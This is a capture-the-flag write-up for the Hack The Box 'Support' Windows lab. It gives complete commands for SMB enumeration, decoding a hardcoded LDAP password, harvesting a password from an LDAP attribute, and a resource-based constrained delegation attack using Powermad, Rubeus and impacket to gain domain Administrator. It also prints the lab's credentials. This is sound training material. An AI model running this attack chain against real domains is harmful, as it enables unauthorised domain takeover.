# HTB – Support | Windows | Easy

## Recon

```bash
nmap -sV -sC -p- --min-rate 5000 <target-ip>
```

**Revealed Ports:**

```
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
```

Classic AD box — Kerberos, LDAP, SMB, WinRM. No web ports. Let's dig in.

---

## SMB Enumeration

Ran `enum4linux` — said no anonymous access to SMB. But doing manual enumeration with guest session told a different story:

```bash
nxc smb support.htb -u 'guest' -p '' --shares
smbclient //support.htb/support-tools -U 'guest' -p ''
```

Found a share called `support-tools` with a bunch of executables — most of them standard sysadmin tools (7zip, Wireshark, Putty etc.), but one stood out:

```
UserInfo.exe.zip
```

Custom app — worth grabbing.

---

## Reverse Engineering — UserInfo.exe

```bash
unzip UserInfo.exe.zip
```

The `.config` file had nothing useful. Opened the binary in **dnSpy** and navigated to `UserInfo.Services` — found a `Protected` class with this:

```csharp
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
private static byte[] key = Encoding.ASCII.GetBytes("armando");
```

XOR encoded password with key `armando`. Decoded it:

```python
import base64
enc = '0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E'
key = b'armando'
arr = base64.b64decode(enc)
print(bytes([arr[i] ^ key[i % len(key)] ^ 223 for i in range(len(arr))]).decode())
```

Got the creds for `ldap@support.htb` : `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

---

## LDAP Enumeration → support user

Ran Bloodhound — came back with nothing interesting at first. So did some manual LDAP searching:

```bash
ldapsearch -x -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'DC=support,DC=htb' '(objectClass=user)' info description
```

Came across the `info` field of the `support` user — had a password sitting right in there: `Ironside47pleasure40Watchful`

Bloodhound doesn't print the `info` field — manual LDAP search is what got this. Good reminder to not rely on tools alone.

---

## Initial Access — support user

```bash
evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
```

```bash
cat user.txt
```

---

## Privilege Escalation — support → Administrator (RBCD)

Back to Bloodhound — turns out `support` is a member of `SHARED SUPPORT ACCOUNTS@SUPPORT.HTB` and that group has **GenericAll** on `DC.SUPPORT.HTB`.

GenericAll on the DC = RBCD attack. The plan: create a fake machine account, set delegation on the DC to trust it, then impersonate Administrator.

**1. Create the fake machine account**

```powershell
Import-Module Powermad
New-MachineAccount -MachineAccount FakeComputer -Password $(ConvertTo-SecureString 'PleaseSubscribe123!' -AsPlainText -Force)
```

**2. Build the security descriptor and set delegation on the DC**

```powershell
$ComputerSid = Get-DomainComputer FakeComputer -Properties objectsid | Select-Object -ExpandProperty objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

**3. Get the hash for FakeComputer**

```powershell
.\Rubeus.exe hash /password:PleaseSubscribe123! /user:FakeComputer$ /domain:support.htb
```

**4. Run S4U and get the ticket**

```powershell
.\Rubeus.exe s4u /user:FakeComputer$ /rc4:7E653B8269D3C7EA3FFCDB7576E2560A /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt /outfile:admin.kirbi
```

This generates 2 tickets — you want `admin_cifs_dc.support.htb.kirbi`. That's the S4U2proxy ticket, the one that actually has access to CIFS on the DC. The other one (`administrator_to_FakeComputer$`) is just the intermediate S4U2self ticket, not useful.

**5. Transfer to Kali and get shell**

```bash
impacket-ticketConverter admin_cifs_dc.support.htb.kirbi administrator.ccache
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass dc.support.htb
```

```bash
cat root.txt
```

---

ROOTED...

RATING : 4/5 
